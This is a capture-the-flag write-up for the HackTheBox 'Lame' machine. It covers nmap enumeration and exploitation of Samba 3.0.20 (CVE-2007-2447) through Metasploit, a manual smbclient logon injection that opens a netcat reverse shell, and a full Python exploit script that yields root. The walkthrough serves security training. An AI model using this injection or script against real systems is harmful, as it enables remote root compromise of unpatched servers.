# Lame

>Author : Alien0ne
>Date : 20 September 2021
>IP : 10.129.224.74
>OS : Linux
>Difficulty : Easy

Lame is a retired machine available on the [HackTheBox](https://hackthebox.eu) platform. It is the first machine published on [HackTheBox](https://hackthebox.eu). This room is rated as easy and recommended for beginners. This room is created by @[ch4p](https://app.hackthebox.eu/users/1).


# Initial Enumeration

* I started the initial enumeration by running a Nmap scan looking for open ports and default scripts.

```sql
┌──(alien0ne㉿kali)-[~/Desktop/hackthebox/lame]
└─$ nmap -sC -sV -Pn 10.129.224.74  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 06:22 EDT
Nmap scan report for 10.129.224.74 (10.129.224.74)
Host is up (0.14s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m39s, deviation: 2h49m45s, median: 37s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-09-20T06:23:45-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.93 seconds
```

*  We can see the Port 21,22,139,445 are open.
* From the above Namp output we can see that the FTP server allows anonymous login.Let us see whats's in there.

```sql
┌──(alien0ne㉿kali)-[~/Desktop/hackthebox/lame]
└─$ ftp 10.129.224.74
Connected to 10.129.224.74.
220 (vsFTPd 2.3.4)
Name (10.129.224.74:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp>
```

* We can see that FTP is empty, so let's try another way.
* We also saw that FTP (vsftpd 2.3.4) runs on an old version from the Nmap output. On searching for exploits on google, I found that it is vulnerable to Backdoor Command Execution. Let us try to exploit it.

```sql
┌──(alien0ne㉿kali)-[~/Desktop/hackthebox/lame]
└─$ msfconsole                                                                                                      ─╯
                                                  

     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
                                `...............`              `...-/////...`


                                  .::::::::::-.                     .::::::-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================

                     Press ENTER to size up the situation

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

                        Press SPACE BAR to continue



       =[ metasploit v6.0.50-dev                          ]
+ -- --=[ 2144 exploits - 1142 auxiliary - 365 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.129.224.74
RHOSTS => 10.129.224.74
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.129.224.74:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.224.74:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

* From the above output, we can see that even though the machine is running at a lower version, it is not vulnerable to `vsftpd 2.3.4` backdoor command execution.

* OK! Let us go back to the Nmap scan. We can see that samba(3.0.20-Debian) is also running at a lower version. Let's try to exploit it.
* We can exploit it in two ways: the [Metasploit](https://www.metasploit.com/) Framework and manually exploiting the service.
* Let us Fire up Metasploit Framework on our remote machine and load the payload.

```bash

┌──(alien0ne㉿kali)-[~/Desktop/hackthebox/lame]
└─$ msfconsole
                                                  

                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
_______________________________________________________________   ,&$$$$$$'_____
                                                                 ll&&$$$$'
                                                              .;;lll&&&&'
                                                            ...;;lllll&'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .


       =[ metasploit v6.0.50-dev                          ]
+ -- --=[ 2144 exploits - 1142 auxiliary - 365 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d

msf6 > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > 

```

* Now set the Remote Host, Local Host, Local Port and run the exploit.

```sql

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.129.224.74
RHOSTS => 10.129.224.74
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.4
LHOST => 10.10.14.4
msf6 exploit(multi/samba/usermap_script) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.4:1234 
[*] Command shell session 1 opened (10.10.14.4:1234 -> 10.129.224.74:35324) at 2021-09-20 07:01:41 -0400
```

* We got a shell and we are root. Lets stabilize the shell with python pty.

```sql
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
```

* Lets get the user and root flags.

```sql
root@lame:/# cd /root
cd /root
root@lame:/root# ls
ls
Desktop  reset_logs.sh  root.txt  vnc.log
root@lame:/root# wc -c root.txt
wc -c root.txt
33 root.txt
root@lame:/root# cd /home
cd /home
root@lame:/home# ls
ls
ftp  makis  service  user
root@lame:/home# cd makis
cd makis
root@lame:/home/makis# ls
ls
user.txt
root@lame:/home/makis# wc -c user.txt
wc -c user.txt
33 user.txt
root@lame:/home/makis# 

```

* Now let us try to exploit the machine manually.
* You may refer to the article below if you want to know more about this exploit.
		
		https://blog.alien0ne.me/cve-2007-2447/
		<br>
	
* Searching for `samba 3.0.20 exploits` on google reveals it has quite some vulnerabilities:
* I found this [EXPLOIT](https://www.exploit-db.com/exploits/16320) on exploit-db. Let us go through the script and start exploiting the machine manually.
* Looking through the script, we can understand that there is a vulnerability in the `username` a field that takes the below parameter along with the payload.

```bash
"/=`nohup " + payload.encoded + "`"
```

* In POSIX or POSIX-like shells (ksh, bash, bash, zsh, yash), The command in the braces of $() or between the backticks (``) is executed in a  sub-shell, and the output is then placed in the original command.
* [`nohup`](https://en.wikipedia.org/wiki/Nohup)  Is a command which means "no hang up", In Linux systems, this command keeps the processes running even after exiting the shell or terminal.
* Now let's send our payload in the username field and the password via smbclient.

```bash

┌──(alien0ne㉿kali)-[~/Desktop/hackthebox/lame]
└─$ smbclient -L 10.129.224.74
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
┌──(alien0ne㉿kali)-[~/Desktop/hackthebox/lame]
└─$ smbclient -L 10.129.224.74 --option="client min protocol=NT1"
Enter WORKGROUP\alien0ne's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
┌──(alien0ne㉿kali)-[~/Desktop/hackthebox/lame]
└─$ smbclient //10.129.224.74/tmp --option="client min protocol=NT1"
Enter WORKGROUP\alien0ne's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 

```
* Once you connect to the share start the nc lister on your remote machine.

```bash
┌──(alien0ne㉿kali)-[~]
└─$ nc -lvnp 1334
listening on [any] 1334 ...
```

* Now run the logon command and you get the shell.

```bash

smb: \> logon "./=`nohup nc -e /bin/bash 10.10.14.4 1234`" "password"

```

```sql

┌──(alien0ne㉿kali)-[/home/kali/Desktop/hackthebox]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.4] from (UNKNOWN) [10.129.224.74] 33335
id
uid=0(root) gid=0(root)
cd /root
wc -c root.txt
33 root.txt
```

* Now that we understood how the exploit works let's make a customizable script in python that allows us to send this command through the Samba connection passing the local and remote information as arguments.


```python
from sys import argv
from smb.SMBConnection import SMBConnection


def exploit(rhost, rport, lhost, lport):
    payload = "nc -e /bin/sh " + lhost + " " + lport
    username = "./=`nohup " + payload + "`"
    conn = SMBConnection(username, "", "", "")
    print(f"[+] Start the Netcat listener on port {lport} and press any key.")
    p=input()
    print("[+] Connecting to smb.")
    try:
        conn.connect(rhost, int(rport), timeout=1)
    except:
        print("[+] Payload executed Successfully :)\n[+] Check your Netcat listener.")
    
if len(argv) != 5:
    print(f"Usage:\n\t{argv[0]} <rhost> <rport> <lhost> <lport> ")
    exit()
else:
    print("[+] CVE-2007-2447 - Samba usermap script")
    print("[+] Creating payload.")
    rhost = argv[1]
    rport = argv[2]
    lhost = argv[3]
    lport = argv[4]
    exploit(rhost, rport, lhost, lport)
```

NOTE: Install the `pysmb` module using pip. You may do this like show below.

```bash
sudo apt-get -y install python3-pip
pip3 install pysmb

```

* You could refer to the link below for the usage https://github.com/Alien0ne/CVE-2007-2447

* Run the script as shown below.

```bash
┌──(alien0ne㉿kali)-[~]
└─$python3 exploit.py 10.129.167.68 139 10.10.14.15 1334
[+] CVE-2007-2447 - Samba usermap script
[+] Creating payload.
[+] Start the Netcat listener on port 1334 and press any key.

[+] Connecting to smb.
[+] Payload executed Successfully :)
[+] Check your Netcat listener.
```
*  Now we got a shell in our Netcat session, and we are Root :)

```bash
┌──(alien0ne㉿kali)-[~]
└─$ nc -lvnp 1334
listening on [any] 1334 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.167.68] 56606
id    
uid=0(root) gid=0(root)
cd /root
wc -c root.txt
33 root.txt
```

Thanks for reading! Make sure you subscribe to the [blog](https://blog.alien0ne.me) for more upcoming HackTheBox writeups!